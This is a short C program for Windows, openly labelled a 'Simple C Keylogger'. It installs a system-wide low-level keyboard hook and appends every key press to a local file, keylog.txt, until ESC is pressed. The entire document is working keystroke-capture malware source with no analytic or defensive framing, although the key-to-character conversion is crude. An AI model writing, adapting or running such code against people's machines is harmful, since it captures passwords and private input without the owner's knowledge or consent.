#include <windows.h>
#include <stdio.h>

#define LOG_FILE "keylog.txt"

HHOOK hHook = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        FILE *file = fopen(LOG_FILE, "a+");
        if (file) {
            switch (wParam) {
                case WM_KEYDOWN:
                case WM_SYSKEYDOWN:
                    fprintf(file,"%c", (char) pKeyBoard->vkCode);
                    break;
            }   
            fclose(file);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void SetHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hHook == NULL) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    }
}

void ReleaseHook() {
    if (hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}

int main() {
    printf("Simple C Keylogger\n");
    printf("Logging keys to " LOG_FILE "\n");
    printf("Press ESC to stop logging...\n");

    SetHook();

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_ESCAPE) {
            break; // Exit on ESC key
        }
    }
    ReleaseHook();
    return 0;
}